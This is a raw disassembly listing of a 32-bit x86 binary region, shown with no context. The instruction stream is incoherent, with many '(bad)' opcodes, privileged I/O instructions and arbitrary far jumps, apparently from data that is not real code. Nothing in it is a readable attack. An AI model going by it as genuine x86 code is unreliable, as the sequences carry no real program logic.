  406bef:	add    BYTE PTR [eax],al
  406bf1:	stos   BYTE PTR es:[edi],al
  406bf2:	dec    edi
  406bf3:	cmp    eax,0x94d19ef3
  406bf8:	dec    ebp
  406bf9:	aas    
  406bfa:	xor    al,0x90
  406bfc:	xchg   esp,eax
  406bfd:	dec    esi
  406bfe:	adc    edx,DWORD PTR [ebp+0x70df2b99]
  406c04:	push   es
  406c05:	in     al,dx
  406c06:	push   esi
  406c07:	jle    0x406bc6
  406c09:	(bad)  
  406c0a:	ficomp WORD PTR [eax-0x3ded2c42]
  406c10:	jmp    0x406b9d
  406c12:	cmp    ebp,edi
  406c14:	cmovne edi,DWORD PTR [ebp-0x2d060fac]
  406c1b:	dec    esp
  406c1c:	add    BYTE PTR [eax],0x0
  406c1f:	pop    es
  406c20:	adc    al,0xbe
  406c22:	cld    
  406c23:	pop    es
  406c24:	add    BYTE PTR [eax+eax*1+0x0],bh
  406c28:	sub    al,0xb3
  406c2a:	add    DWORD PTR [ebp-0x40],esi
  406c2d:	daa    
  406c2e:	add    BYTE PTR [eax],al
  406c30:	cld    
  406c31:	lahf   
  406c32:	enter  0x9a,0x0
  406c36:	sub    al,BYTE PTR [ebp+0x5555b69a]
  406c3c:	sbb    eax,DWORD PTR [edi+0x1b0efd22]
  406c42:	mov    edi,0xd9d666e9
  406c47:	ss sub ah,ch
  406c4a:	cmp    BYTE PTR [esi+ebx*2+0x67970000],cl
  406c51:	jbe    0x406cc6
  406c53:	add    DWORD PTR ds:0xe09e9cc6,ecx
  406c59:	and    eax,0x558e9da5
  406c5e:	cmc    
  406c5f:	sbb    bl,BYTE PTR [edi]
  406c61:	and    DWORD PTR ds:0xe9be930e,edi
  406c67:	imul   ebp,DWORD PTR [esi-0x5bd7c928],0x38
  406c6e:	pop    edi
  406c6f:	xchg   edi,eax
  406c70:	pop    ds
  406c71:	leave  
  406c72:	stos   BYTE PTR es:[edi],al
  406c73:	or     bl,BYTE PTR [eax]
  406c75:	and    eax,esp
  406c77:	sahf   
  406c78:	sbb    eax,0x8a9c8727
  406c7d:	sub    ah,dl
  406c7f:	add    eax,0xf4af2cf9
  406c84:	xor    eax,0x890cd92e
  406c89:	add    BYTE PTR [eax],al
  406c8b:	inc    edi
  406c8c:	pusha  
  406c8d:	push   esp
  406c8e:	sbb    cl,BYTE PTR [edi]
  406c90:	mov    edi,0xfeb2f523
  406c95:	mov    bh,cl
  406c97:	add    BYTE PTR [eax],al
  406c99:	or     eax,ecx
  406c9b:	sldt   WORD PTR [eax]
  406c9e:	and    eax,0x2456ba54
  406ca3:	push   edi
  406ca4:	add    bl,BYTE PTR [esi]
  406ca6:	push   ecx
  406ca7:	into   
  406ca8:	popf   
  406ca9:	adc    DWORD PTR [ebx-0x2b],ebx
  406cac:	cwde   
  406cad:	pop    edx
  406cae:	sub    BYTE PTR ds:0x8e543298,al
  406cb4:	retf   0xd6d7
  406cb7:	sbb    DWORD PTR ds:0xf51ebe9e,edx
  406cbd:	(bad)  
  406cbe:	mov    BYTE PTR [ecx],bl
  406cc0:	add    BYTE PTR [eax],al
  406cc2:	or     DWORD PTR [edx+0x2474593b],edi
  406cc8:	loopne 0x406d21
  406cca:	(bad)  
  406ccb:	cdq    
  406ccc:	pusha  
  406ccd:	sub    BYTE PTR [ecx],al
  406ccf:	sbb    eax,0xfffe2ac9
  406cd4:	fs cmc 
  406cd6:	jo     0x406cd4
  406cd8:	dec    ebp
  406cd9:	add    edx,edi
  406cdb:	and    ebx,DWORD PTR [ebx+0x37]
  406cde:	jo     0x406c7b
  406ce0:	push   es
  406ce1:	int    0x68
  406ce3:	push   cs
  406ce4:	into   
  406ce5:	(bad)  
  406ce6:	jp     0x406ce0
  406ce8:	inc    edi
  406ce9:	push   ecx
  406cea:	cmp    BYTE PTR [eax+eax*4],cl
  406ced:	add    BYTE PTR [eax],al
  406cef:	xchg   ebp,eax
  406cf0:	cmp    esp,0xaa0c
  406cf6:	jne    0x406ca2
  406cf8:	sbb    dh,dl
  406cfa:	pop    eax
  406cfb:	cmp    BYTE PTR [eax],ch
  406cfd:	pop    es
  406cfe:	fidivr WORD PTR [edi]
  406d00:	pop    eax
  406d01:	mov    ebp,0x9a5726dc
  406d06:	(bad)  [ebp+0x34]
  406d09:	cwde   
  406d0a:	mov    esi,0xf20e9ee8
  406d0f:	sar    BYTE PTR [ecx],1
  406d11:	punpckhdq mm4,QWORD PTR [ebx+0xa28cdd]
  406d18:	add    dh,cl
  406d1a:	std    
  406d1b:	mov    ecx,0x45c0c7ae
  406d20:	add    BYTE PTR [eax],al
  406d22:	sub    al,0x98
  406d24:	mov    bh,0xd6
  406d26:	stc    
  406d27:	adc    BYTE PTR [ecx],dh
  406d29:	ins    DWORD PTR es:[edi],dx
  406d2a:	clc    
  406d2b:	or     ecx,ecx
  406d2d:	mov    edi,0x8a55f082
  406d32:	lods   al,BYTE PTR ds:[esi]
  406d33:	fs mov eax,0x2708cd
  406d39:	add    BYTE PTR [edi-0x65d1d467],cl
  406d3f:	adc    eax,0x819621c5
  406d44:	sub    eax,0x27909db3
  406d49:	cli    
  406d4a:	sbb    DWORD PTR [edi+0x63c054],ecx
  406d50:	add    BYTE PTR [ebx-0x10],cl
  406d53:	mov    esp,0x589a6827
  406d58:	and    DWORD PTR [ecx+0x57],0x1299dc20
  406d5f:	sub    BYTE PTR [eax+ebx*8],cl
  406d62:	add    BYTE PTR [eax],al
  406d64:	popf   
  406d65:	je     0x406d89
  406d67:	je     0x406cfe
  406d69:	iret   
  406d6a:	imul   ebp,DWORD PTR [ebx+eax*1],0xf94adddb
  406d71:	jb     0x406d9b
  406d73:	sbb    BYTE PTR [edx],dl
  406d75:	adc    BYTE PTR [edi-0x57ed0ce0],dl
  406d7b:	ss div eax
  406d7e:	xor    edx,edi
  406d80:	jmp    0x406d79
  406d82:	ss sub DWORD PTR ss:[edx-0x3d9dde3e],edx
  406d8a:	aas    
  406d8b:	and    eax,0x39f966
  406d90:	out    dx,eax
  406d91:	add    BYTE PTR [eax],al
  406d93:	repnz mov al,BYTE PTR [edx-0x33d43c9b]
  406d9a:	rol    DWORD PTR [eax],cl
  406d9c:	add    al,cl
  406d9e:	add    al,0x0
  406da0:	add    BYTE PTR ds:0xf75355a7,cl
  406da6:	fisttp DWORD PTR [esp+ebx*2+0x24eb0000]
  406dad:	push   es
  406dae:	xor    DWORD PTR [eax],ecx
  406db0:	mov    dh,0x0
  406db2:	add    BYTE PTR [ebx-0x107d3108],al
  406db8:	xor    al,0x84
  406dba:	das    
  406dbb:	add    BYTE PTR [eax],al
  406dbd:	sub    esp,DWORD PTR [edi]
  406dbf:	mov    cl,0x78
  406dc1:	in     al,dx
  406dc2:	clc    
  406dc3:	add    edx,DWORD PTR [ebx]
  406dc5:	les    ebx,FWORD PTR [eax+eax*1]
  406dc8:	add    BYTE PTR [edi+0x63],ch
  406dcb:	and    ebp,esi
  406dcd:	es popa 
  406dcf:	adc    ah,bl
  406dd1:	lods   eax,DWORD PTR ds:[esi]
  406dd2:	dec    edx
  406dd3:	shl    BYTE PTR [edx+0x0],0x0
  406dd7:	fdivr  QWORD PTR [ebp-0x62d22ba4]
  406ddd:	add    al,0xa
  406ddf:	add    BYTE PTR [eax],al
  406de1:	das    
  406de2:	into   
  406de3:	xchg   ebp,eax
  406de4:	popa   
  406de5:	pop    eax
  406de6:	push   es
  406de7:	or     DWORD PTR [edx+0x29],esi
  406dea:	inc    esi
  406deb:	jp     0x406dde
  406ded:	pop    edx
  406dee:	mov    ebp,0x13ed1506
  406df3:	and    eax,0xda7a39bc
  406df8:	push   esi
  406df9:	(bad)  
  406dfa:	punpcklwd mm2,DWORD PTR [edx+0x2f08]
  406e01:	mov    esi,0x8c3694bd
  406e06:	xor    al,0x0
  406e08:	add    BYTE PTR [ebp-0x9],bl
  406e0b:	ins    BYTE PTR es:[edi],dx
  406e0c:	ss cld 
  406e0e:	mov    esi,DWORD PTR [esi]
  406e10:	(bad)  
  406e12:	add    BYTE PTR ds:[eax],al
  406e15:	push   eax
  406e16:	mov    ecx,0xc3d3ac8b
  406e1b:	loope  0x406e2c
  406e1d:	mov    dl,0xc6
  406e1f:	dec    esi
  406e20:	push   cs
  406e21:	imul   esp,DWORD PTR [edi],0x22c621b8
  406e27:	xor    eax,0x4878ab55
  406e2c:	ret    0x0
  406e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e30:	lods   al,BYTE PTR ds:[esi]
  406e31:	and    dh,BYTE PTR [ebx+0x59]
  406e34:	mov    BYTE PTR [esi+0x0],cl
  406e37:	add    BYTE PTR [esi],ch
  406e39:	je     0x406dfc
  406e3b:	sub    DWORD PTR [ebx+ebx*2+0x8],esp
  406e3f:	je     0x406e41
  406e41:	add    BYTE PTR [ecx-0x670de468],ah
  406e47:	into   
  406e48:	dec    esi
  406e49:	jg     0x406e48
  406e4b:	jecxz  0x406e51
  406e4d:	inc    esp
  406e4e:	add    BYTE PTR [eax],al
  406e50:	mov    edx,ebp
  406e52:	stos   BYTE PTR es:[edi],al
  406e53:	dec    BYTE PTR [ebp-0x5514cb6d]
  406e59:	js     0x406ea8
  406e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e5c:	mov    ebp,0xf1597cf0
  406e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e62:	mov    dh,0xff
  406e64:	call   0x4e00:0xe4c416
  406e6b:	(bad)  
  406e6c:	dec    edi
  406e6d:	and    DWORD PTR [edx+ebx*4-0x6b14dbcc],edi
  406e74:	aad    0x2a
  406e76:	pop    edi
  406e77:	or     cl,BYTE PTR [esi+ecx*1+0x0]
  406e7b:	add    BYTE PTR [ebp-0x500f08f6],ch
  406e81:	ret    
  406e82:	loope  0x406eaf
  406e84:	lds    ebp,FWORD PTR [eax]
  406e86:	and    BYTE PTR [ecx+0x45fd1edc],0x85
  406e8d:	ds sbb eax,0xfa144b43
  406e93:	jo     0x406ee5
  406e95:	mov    bh,0x6b
  406e97:	mov    ah,0xe
  406e99:	mov    dl,0x32
  406e9b:	not    DWORD PTR [eax-0x55]
  406e9e:	stos   BYTE PTR es:[edi],al
  406e9f:	xchg   ecx,eax
  406ea0:	fistp  QWORD PTR [edx]
  406ea2:	or     BYTE PTR [ecx+0xb6d0000],dl
  406ea8:	clc    
  406ea9:	aas    
  406eaa:	clc    
  406eab:	and    BYTE PTR [ebx-0x1e],ch
  406eae:	dec    ecx
  406eaf:	or     al,0xe1
  406eb1:	add    BYTE PTR [eax],al
  406eb3:	push   0x177889a1
  406eb8:	jmp    0xa6aa:0x999eec66
  406ebf:	pop    ds
  406ec0:	mov    dh,0x87
  406ec2:	stos   BYTE PTR es:[edi],al
  406ec3:	ror    DWORD PTR cs:[bx],cl
  406ec7:	mov    eax,0x2f46b7f1
  406ecc:	inc    eax
  406ecd:	mov    al,0x0
  406ecf:	add    bh,bl
  406ed1:	push   cs
  406ed2:	ficomp DWORD PTR [ebx+0xb148]
  406ed8:	std    
  406ed9:	add    al,0xf9
  406edb:	add    BYTE PTR [eax],al
  406edd:	inc    eax
  406ede:	cli    
  406edf:	add    BYTE PTR [eax],al
  406ee1:	push   ds
  406ee2:	or     al,dh
  406ee4:	cmp    ecx,DWORD PTR [ebx]
  406ee6:	inc    esi
  406ee7:	cmp    dh,BYTE PTR [ebp+edi*4-0x4331a522]
  406eee:	cli    
  406eef:	mov    ecx,0xedc0aefa
  406ef4:	add    BYTE PTR [eax],al
  406ef6:	xor    al,0x2b
  406ef8:	lods   al,BYTE PTR ds:[esi]
  406ef9:	push   edx
  406efa:	(bad)  
  406efb:	xchg   esp,eax
  406efc:	sub    al,0x28
  406efe:	inc    ecx
  406eff:	mov    ah,0x8d
  406f01:	sub    al,0x7f
  406f03:	popf   
  406f04:	mov    ah,BYTE PTR [edx]
  406f06:	and    bh,BYTE PTR [esp+eax*8]
  406f09:	xor    al,0x0
  406f0b:	add    BYTE PTR ds:0x4184,al
  406f11:	out    dx,al
  406f12:	mov    dl,0xb8
  406f14:	icebp  
  406f15:	sahf   
  406f16:	repz mov ebx,0xd171f6c7
  406f1c:	jmp    0x406f55
  406f1e:	lahf   
  406f1f:	or     BYTE PTR [eax+eax*1+0x51eada00],al
  406f26:	lds    ebx,FWORD PTR [ecx-0x4481ebb7]
  406f2c:	cmp    eax,0x22749bdc
  406f31:	pusha  
  406f32:	pop    edx
  406f33:	clc    
  406f34:	cdq    
  406f35:	(bad)  
  406f36:	sub    dl,BYTE PTR [esi+0x14]
  406f39:	xor    al,0xfd
  406f3b:	sub    eax,0x9f4d87dc
  406f40:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  406f42:	les    esi,FWORD PTR [edi+0x0]
  406f45:	add    BYTE PTR [ebx+0xa],bh
  406f48:	push   ss
  406f49:	mov    ds:0x92d4d60d,al
  406f4e:	dec    eax
  406f4f:	mov    WORD PTR [eax],es
  406f51:	add    BYTE PTR [eax-0x32],al
  406f54:	add    BYTE PTR [eax],al
  406f56:	mov    ch,0xa
  406f58:	scas   al,BYTE PTR es:[edi]
  406f59:	loope  0x406f2e
  406f5b:	leave  
  406f5c:	inc    esp
  406f5d:	add    BYTE PTR fs:[eax],al
  406f60:	mov    eax,0x98c
  406f65:	out    dx,eax
  406f66:	and    eax,esp
  406f68:	push   cs
  406f69:	iret   
  406f6a:	and    edx,DWORD PTR [ebp+0x69]
  406f6d:	sbb    cl,BYTE PTR [esi+0x31193d1b]
  406f73:	push   0x726c429e
  406f78:	jb     0x406f6c
  406f7a:	cmp    ebp,DWORD PTR [ecx+0x43]
  406f7d:	(bad)  
  406f7e:	repz rcr BYTE PTR [edi],1
  406f81:	mov    bl,0x3
  406f83:	add    al,0x24
  406f85:	add    BYTE PTR [eax],al
  406f87:	js     0x406f6b
  406f89:	mov    edi,DWORD PTR [ecx+0x27]
  406f8c:	jge    0x406f13
  406f8e:	cmc    
  406f8f:	aad    0x66
  406f91:	fmul   DWORD PTR [edx]
  406f93:	jnp    0x406f20
  406f95:	inc    ecx
  406f96:	sti    
  406f97:	aam    0xf2
  406f99:	hlt    
  406f9a:	mov    edx,0xf51f3bea
  406f9f:	and    al,0xb9
  406fa1:	adc    BYTE PTR [edx-0x11d8c670],bl
  406fa7:	xor    DWORD PTR cs:[ebx+0x5e],0x2d
  406fac:	cmp    ecx,DWORD PTR [ebp+0x5]
  406faf:	mov    ah,0xb1
  406fb1:	jbe    0x406faa
  406fb3:	xor    DWORD PTR [esp+ecx*2],0xffffffc2
  406fb7:	add    BYTE PTR [eax],al
  406fb9:	rcr    BYTE PTR [eax+0x36f45da4],cl
  406fbf:	push   ds
  406fc0:	cmp    edx,DWORD PTR ds:[esi+ecx*2]
  406fc4:	xor    ah,0xc8
  406fc7:	mov    BYTE PTR [eax],al
  406fc9:	add    bh,bl
  406fcb:	mov    cs,ebx
  406fcd:	and    al,0x35
  406fcf:	mov    ah,0x9e
  406fd1:	xor    al,0xc4
  406fd3:	inc    esi
  406fd4:	add    BYTE PTR [eax],al
  406fd6:	ret    0x5392
  406fd9:	push   edi
  406fda:	sbb    al,0xcb
  406fdc:	sbb    BYTE PTR ds:0x9580,dh
  406fe2:	jmp    ecx
  406fe4:	inc    edx
  406fe5:	xor    ecx,DWORD PTR [edx+0x28]
  406fe8:	and    eax,0x831165ac
  406fed:	in     al,dx
  406fee:	fwait
  406fef:	sub    eax,0x66f1b890
  406ff4:	inc    ebx
  406ff5:	jg     0x406fec
  406ff7:	jno    0x407007
  406ff9:	in     al,dx
  406ffa:	mov    dh,0x4c
  406ffc:	sub    DWORD PTR [eax],eax
  406ffe:	add    al,dl
  407000:	loope  0x406fef
  407002:	les    eax,FWORD PTR [esi+0x0]
  407005:	add    BYTE PTR [ecx],bh
  407007:	xchg   esi,eax
  407008:	ret    
  407009:	mov    ebp,0xb0175646
  40700e:	push   edi
  40700f:	push   esp
  407010:	icebp  
  407011:	out    dx,eax
  407012:	sub    esi,DWORD PTR [eax+0x7b18132b]
  407018:	push   ss
  407019:	mov    edi,0xe1e6c731
  40701e:	js     0x406fda
  407020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407021:	pushf  
  407022:	pop    edx
  407023:	bound  ebp,QWORD PTR [edx+ebp*2+0xb20cfb7]
  40702a:	jg     0x40709e
  40702c:	and    DWORD PTR [eax-0x37fffff2],ecx
  407032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407033:	add    BYTE PTR [eax],al
  407035:	iret   
  407036:	in     al,0x12
  407038:	jle    0x406fbb
  40703a:	inc    eax
  40703b:	add    BYTE PTR fs:[eax],al
  40703e:	sahf   
  40703f:	arpl   WORD PTR [ecx],sp
  407041:	lods   eax,DWORD PTR ds:[si]
  407043:	xchg   ebx,eax
  407044:	(bad)  
  407045:	aas    
  407046:	sub    bh,BYTE PTR [edx]
  407048:	sbb    bl,BYTE PTR [eax+0x279b35dd]
  40704e:	adc    dl,ah
  407050:	add    al,0xf4
  407052:	add    BYTE PTR [eax],al
  407054:	sbb    al,ah
  407056:	push   ds
  407057:	or     DWORD PTR [ecx],eax
  407059:	loopne 0x4070d7
  40705b:	sbb    eax,0xb6539461
  407060:	adc    BYTE PTR [edi+0x6c],dh
  407063:	cli    
  407064:	pop    ebx
  407065:	xlat   BYTE PTR ds:[ebx]
  407066:	push   cs
  407067:	adc    dl,dh
  407069:	inc    ebx
  40706a:	cs cs popa 
  40706d:	stc    
  40706e:	xor    BYTE PTR [ebx-0x2f7c00d2],bl
  407074:	jecxz  0x407043
  407076:	xor    esp,DWORD PTR ds:0x768fb3c6
  40707c:	scas   al,BYTE PTR es:[edi]
  40707d:	cmp    bh,0x0
  407080:	add    BYTE PTR [esi+0x5d],ch
  407083:	mov    esp,DWORD PTR [ebx+0xd560fd3]
  407089:	in     eax,dx
  40708a:	mov    ds:0x5d7db710,eax
  40708f:	fimul  WORD PTR [eax+ecx*4]
  407092:	add    BYTE PTR [eax],al
  407094:	out    0x1,eax
  407096:	shl    DWORD PTR [esi-0xcdf68ae],0x69
  40709d:	xor    al,0x14
  40709f:	retf   
  4070a0:	ror    DWORD PTR [ebp+0x11],1
  4070a3:	adc    eax,edx
  4070a5:	bound  esp,QWORD PTR [edx+edi*4]
  4070a8:	frstor ds:0xa46130eb
  4070ae:	inc    ebx
  4070af:	xchg   esi,eax
  4070b0:	or     eax,0xd44007
  4070b5:	add    dl,dh
  4070b7:	add    eax,0xc7ccef
  4070bc:	add    cl,al
  4070be:	add    edi,esp
  4070c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070c1:	sbb    esi,esi
  4070c3:	enter  0x48,0x0
  4070c7:	icebp  
  4070c8:	bound  ebp,QWORD PTR [esi+ecx*1+0x50cb9c14]
  4070cf:	pushf  
  4070d0:	mov    DWORD PTR [ebx+0x1],ebx
  4070d3:	push   0x31d58e64
  4070d8:	sbb    eax,0x61140377
  4070dd:	and    bl,BYTE PTR [eax+edi*8-0x4c]
  4070e1:	ss dec ebx
  4070e3:	jnp    0x407086
  4070e5:	jp     0x40706d
  4070e7:	mov    ah,0x14
  4070e9:	sahf   
  4070ea:	sbb    edi,ebp
  4070ec:	push   es
  4070ed:	ret    
  4070ee:	xor    al,0x1d
  4070f0:	inc    ebx
  4070f1:	dec    edx
  4070f2:	mov    ch,0xdb
  4070f4:	fld    QWORD PTR [ecx+0x5d]
  4070f7:	xchg   ebx,esp
  4070f9:	lds    ecx,FWORD PTR [ecx]
  4070fb:	sub    edx,0x19
  4070fe:	(bad)  
  4070ff:	mov    dl,0x72
  407101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407102:	mov    ah,BYTE PTR [edi+0x54]
  407105:	fisub  DWORD PTR [eax]
  407107:	lods   al,BYTE PTR ds:[esi]
  407108:	test   BYTE PTR [ebx+0x0],cl
  40710b:	add    BYTE PTR [ebp+0x5ddcf630],bl
  407111:	out    0xa2,eax
  407113:	dec    esp
  407114:	retf   0x0
  407117:	(bad)  
  407118:	mov    ds:0x476aef8e,eax
  40711d:	pop    ebp
  40711e:	sbb    DWORD PTR [edx+0x3d365d30],esi
  407124:	sub    al,0x5d
  407126:	push   ecx
  407127:	sub    eax,0xf044
  40712c:	fild   QWORD PTR [ecx]
  40712e:	mov    ecx,0xace9aab0
  407133:	cmp    eax,0x4813e0df
  407138:	mov    ch,0x0
  40713a:	add    BYTE PTR [edx],bl
  40713c:	fisubr DWORD PTR [esp+edi*4-0x5bce3c77]
  407143:	fst    QWORD PTR [ebp*2-0x30d7025b]
  40714a:	add    DWORD PTR [ecx+0xa30c63],ebx
  407150:	add    BYTE PTR [ebp+eax*1+0x7c],dl
  407154:	xchg   ebp,eax
  407155:	pop    ebp
  407156:	in     eax,dx
  407157:	inc    al
  407159:	scas   al,BYTE PTR es:[edi]
  40715a:	add    BYTE PTR [eax],al
  40715c:	jo     0x407193
  40715e:	addr16 pop ebp
  407160:	fdiv   st,st(1)
  407162:	dec    esp
  407163:	hlt    
  407164:	add    BYTE PTR [eax],al
  407166:	scas   al,BYTE PTR es:[edi]
  407167:	stos   DWORD PTR es:[edi],eax
  407168:	clc    
  407169:	xchg   edi,eax
  40716a:	and    ah,al
  40716c:	js     0x4071a8
  40716e:	mov    edi,0x7fb67db0
  407173:	mov    eax,ds:0xe1b0e8c3
  407178:	add    bh,dh
  40717a:	add    BYTE PTR [eax],al
  40717c:	sbb    eax,0x39ad3e6d
  407181:	hlt    
  407182:	mov    ebp,0x1d5f9420
  407187:	int    0x3c
  407189:	popf   
  40718a:	call   0x432ad4df
  40718f:	ficom  WORD PTR [edi]
  407191:	iret   
  407192:	ja     0x407163
  407194:	ins    DWORD PTR es:[edi],dx
  407195:	cmc    
  407196:	mov    ebx,0x44f31a2a
  40719b:	fild   WORD PTR [eax]
  40719d:	add    BYTE PTR [ebp+0x7c],bl
  4071a0:	mov    DWORD PTR [esi],ebx
  4071a2:	call   0x8803:0x928f076c
  4071a9:	outs   dx,DWORD PTR ds:[esi]
  4071aa:	add    BYTE PTR [eax],al
  4071ac:	inc    eax
  4071ad:	dec    esp
  4071ae:	add    BYTE PTR [eax],al
  4071b0:	dec    ch
  4071b2:	inc    esp
  4071b3:	xor    al,0x0
  4071b5:	add    BYTE PTR [esi-0x2],ah
  4071b8:	movd   mm0,DWORD PTR [esi-0x47]
  4071bc:	or     BYTE PTR [ecx],ch
  4071be:	add    BYTE PTR [eax],al
  4071c0:	outs   dx,BYTE PTR ds:[esi]
  4071c1:	push   ecx
  4071c2:	pop    ss
  4071c3:	in     al,dx
  4071c4:	and    ecx,DWORD PTR [ecx+0x17]
  4071c7:	in     eax,dx
  4071c8:	mov    bh,0x9c
  4071ca:	loope  0x4071f8
  4071cc:	adc    eax,0xcaec68a2
  4071d1:	aad    0x1a
  4071d3:	(bad)  [esi+0x31ff456b]
  4071d9:	aam    0x75
  4071db:	cld    
  4071dc:	stc    
  4071dd:	xor    dl,al
  4071df:	test   BYTE PTR [edx],ch
  4071e1:	add    BYTE PTR [eax],al
  4071e3:	dec    edi
  4071e4:	cmp    eax,0x3dc8
  4071e9:	and    edx,DWORD PTR [ebx-0x31f3701f]
  4071ef:	add    BYTE PTR [eax],al
  4071f1:	jge    0x4071ae
  4071f3:	fist   WORD PTR [edx+0x22eaecac]
  4071f9:	cmp    eax,0xcfc2a2d3
  4071fe:	sbb    ebp,DWORD PTR [edi+0xd]
  407201:	lock dec ecx
  407203:	popa   
  407204:	jno    0x40718d
  407206:	mov    ebx,0xc7b25bd4
  40720b:	cmc    
  40720c:	sbb    DWORD PTR [ecx+0xfacce9],edi
  407212:	add    ch,dh
  407214:	int3   
  407215:	sbb    eax,0xfde30000
  40721a:	retf   
  40721b:	call   0x416a2c
  407220:	push   edi
  407222:	pop    esi
  407223:	jg     0x407225
  407225:	ja     0x407227
  407227:	add    BYTE PTR [edx],dl
  407229:	rcr    DWORD PTR [ebp-0x3],cl
  40722c:	jp     0x407263
  40722e:	pop    eax
  40722f:	mov    al,0x44
  407231:	loopne 0x407233
  407233:	add    al,cl
  407235:	int    0x0
  407237:	add    BYTE PTR [eax],cl
  407239:	hlt    
  40723a:	add    BYTE PTR [eax],al
  40723c:	and    edx,ebp
  40723e:	or     eax,0x6125657b
  407243:	repnz and eax,0x47507b2
  407249:	jne    0x40724b
  40724b:	add    BYTE PTR [esi],dl
  40724d:	sbb    DWORD PTR [ebx+0x74cc63],eax
  407253:	add    BYTE PTR [ebx],bh
  407255:	xchg   esi,eax
  407256:	test   eax,0x41e23b6d
  40725b:	xor    DWORD PTR [ebx+0x35],ecx
  40725e:	dec    esi
  40725f:	pusha  
  407260:	pop    eax
  407261:	push   ecx
  407262:	sti    
  407263:	shl    BYTE PTR [eax],cl
  407265:	jmp    0x75:0x44cae7ac
  40726c:	add    BYTE PTR [edx+0x39196896],ch
  407272:	push   0xc18a46ad
  407277:	retf   
  407278:	in     eax,dx
  407279:	ds jmp 0xc500:0x8b4802
  407281:	inc    ecx
  407282:	stos   DWORD PTR es:[edi],eax
  407283:	pushf  
  407284:	out    dx,eax
  407285:	lock mov ds:0x44dcffcb,eax
  40728b:	xor    DWORD PTR [eax],eax
  40728d:	add    BYTE PTR [esi],bh
  40728f:	clc    
  407290:	popf   
  407291:	repnz cmp ecx,esi
  407294:	inc    eax
  407295:	xchg   ebp,eax
  407296:	add    BYTE PTR [eax],al
  407298:	scas   eax,DWORD PTR es:[edi]
  407299:	mov    ds:0xb2007c,eax
  40729e:	add    al,bh
  4072a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072a1:	neg    esi
  4072a3:	or     ebp,DWORD PTR [ebx]
  4072a5:	shl    dh,cl
  4072a7:	ins    BYTE PTR es:[edi],dx
  4072a8:	or     dh,dh
  4072aa:	leave  
  4072ab:	int    0x2e
  4072ad:	(bad)  
  4072ae:	scas   al,BYTE PTR es:[edi]
  4072af:	cmc    
  4072b0:	xchg   esp,eax
  4072b1:	mov    ecx,0xb0ef5018
  4072b6:	dec    edx
  4072b7:	mov    cl,0x2f
  4072b9:	pop    es
  4072ba:	fxch   st(3)
  4072bc:	pop    eax
  4072bd:	in     al,dx
  4072be:	repz cmp DWORD PTR [ecx+eax*8-0x52],esp
  4072c3:	sbb    cl,BYTE PTR [edi]
  4072c5:	jae    0x4072c2
  4072c7:	jge    0x40733f
  4072c9:	hlt    
  4072ca:	xor    cl,bl
  4072cc:	test   esp,0xe00000d3
  4072d2:	cmp    DWORD PTR [edi],0xc
  4072d5:	push   es
  4072d6:	add    BYTE PTR [eax],al
  4072d8:	jmp    0x6c4d:0xc6e37022
  4072df:	shl    ebp,cl
  4072e1:	add    eax,0xe9447cd5
  4072e6:	add    BYTE PTR [eax],al
  4072e8:	sub    ebp,ebx
  4072ea:	in     eax,0x66
  4072ec:	cli    
  4072ed:	inc    esp
  4072ee:	ins    BYTE PTR es:[edi],dx
  4072ef:	add    BYTE PTR [eax],al
  4072f1:	in     al,0xcb
  4072f3:	sbb    al,0xe7
  4072f5:	cli    
  4072f6:	sbb    eax,0xe429e77c
  4072fb:	outs   dx,DWORD PTR ds:[esi]
  4072fc:	add    al,0xbe
  4072fe:	add    BYTE PTR [eax],al
  407300:	(bad)  
  407302:	mov    WORD PTR [edi+0x0],es
  407305:	add    BYTE PTR [edi+0x303b537f],dl
  40730b:	out    dx,eax
  40730c:	adc    eax,0xc00170fe
  407311:	xchg   ebp,eax
  407312:	add    BYTE PTR [eax],al
  407314:	imul   ecx,DWORD PTR [ebx-0x69],0xffffffea
  407318:	xchg   BYTE PTR [ebp-0x1f],ch
  40731b:	rol    BYTE PTR [edi],0x0
  40731e:	add    BYTE PTR [edi],cl
  407320:	clc    
  407321:	push   cs
  407322:	dec    ecx
  407323:	mov    WORD PTR [ebp+0x0],?
  407326:	add    BYTE PTR ds:0xff280f67,dl
  40732c:	fstp   QWORD PTR [edi+0x9148b1]
  407332:	add    BYTE PTR [ecx+0x20],cl
  407335:	div    BYTE PTR [edi-0x51]
  407338:	cmc    
  407339:	mov    WORD PTR [ebx],?
  40733b:	add    BYTE PTR [eax],al
  40733d:	imul   edi,DWORD PTR [edx+0xcac06c],0xe1892700
  407347:	int    0xdc
  407349:	nop
  40734a:	out    0xc2,al
  40734c:	mov    ?,ebp
  40734e:	pop    ecx
  40734f:	aas    
  407350:	jo     0x40734c
  407352:	lahf   
  407353:	out    dx,eax
  407354:	out    0xdd,eax
  407356:	and    esi,DWORD PTR [eax+0x4ea1f659]
  40735c:	call   0xf0cd4136
  407361:	add    BYTE PTR [eax],al
  407363:	xchg   esi,eax
  407364:	xchg   ecx,eax
  407365:	pop    edx
  407366:	dec    ecx
  407367:	ret    
  407368:	adc    DWORD PTR [ebx-0x20],0x52cc
  40736f:	mov    ebp,0xd91c71a6
  407374:	or     DWORD PTR [edx],ecx
  407376:	sub    al,0x32
  407378:	inc    esi
  407379:	mov    ch,0xe2
  40737b:	fnsave [ecx+esi*2-0xf6e1376]
  407382:	cmp    eax,0x3f4dc5dd
  407387:	aad    0x30
  407389:	xor    ecx,DWORD PTR [esi-0x12]
  40738c:	push   esi
  40738d:	xor    al,0x62
  40738f:	enter  0x34,0x0
  407393:	xchg   esp,eax
  407394:	daa    
  407395:	stos   BYTE PTR es:[edi],al
  407396:	sbb    DWORD PTR fs:[ebx+eax*1],edi
  40739a:	inc    edi
  40739b:	ss xchg esp,eax
  40739d:	hlt    
  40739e:	in     eax,dx
  40739f:	dec    esi
  4073a0:	add    BYTE PTR [edi+0x475f0000],cl
  4073a6:	clc    
  4073a7:	cmove  ebx,edx
  4073aa:	add    BYTE PTR [eax],al
  4073ac:	enter  0x99,0x0
